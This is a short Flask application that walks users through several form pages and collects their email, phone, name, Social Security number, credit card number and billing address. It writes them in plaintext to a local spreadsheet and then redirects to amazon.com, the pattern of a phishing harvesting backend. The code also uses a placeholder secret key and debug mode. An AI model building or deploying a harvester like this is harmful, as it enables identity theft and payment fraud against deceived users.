from flask import Flask, render_template, request, redirect, session, url_for
import openpyxl

app = Flask(__name__)
app.secret_key = 'your_secret_key'  # Required for session management

# Load the Excel workbook and select the active worksheet
wb = openpyxl.load_workbook('data/user_data.xlsx')
ws = wb.active

@app.route('/')
def email():
    return render_template('email.html')

@app.route('/phone', methods=['POST'])
def phone():
    session['email'] = request.form['email']
    return render_template('phone.html')

@app.route('/personal', methods=['POST'])
def personal():
    session['phone'] = request.form['phone']
    return render_template('personal.html')

@app.route('/visa', methods=['POST'])
def visa():
    session['first_name'] = request.form['first_name']
    session['last_name'] = request.form['last_name']
    return render_template('visa.html')

@app.route('/submit', methods=['POST'])
def submit():
    first_name = session['first_name']
    last_name = session['last_name']
    email = session['email']
    phone = session['phone']
    visa = {
        'area_code': request.form['area_code'],
        'ssn': request.form['ssn'],
        'credit_card_number': request.form['credit_card_number'],
        'billing_address': request.form['billing_address']
    }

    # Append a new row with the user data
    ws.append([first_name, last_name, email, phone, visa['area_code'], visa['ssn'], visa['credit_card_number'], visa['billing_address']])

    # Save the workbook
    wb.save('data/user_data.xlsx')

    return redirect('https://www.amazon.com')

if __name__ == '__main__':
    app.run(debug=True)